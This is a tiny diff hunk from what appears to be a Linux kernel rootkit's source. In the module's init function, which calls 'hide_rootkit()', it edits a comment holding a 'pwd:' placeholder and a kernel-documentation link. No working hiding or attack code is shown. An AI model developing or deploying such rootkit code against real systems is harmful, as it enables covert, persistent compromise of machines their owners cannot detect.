@@ -284,8 +284,7 @@ static int __init rootkit_init(void)
 	 */
 	hide_rootkit();
 
-	/* pwd: 
-	 *
+	/*
 	 * link: https://lwn.net/Articles/88052/
 	 * 
 	 * sect_attrs:
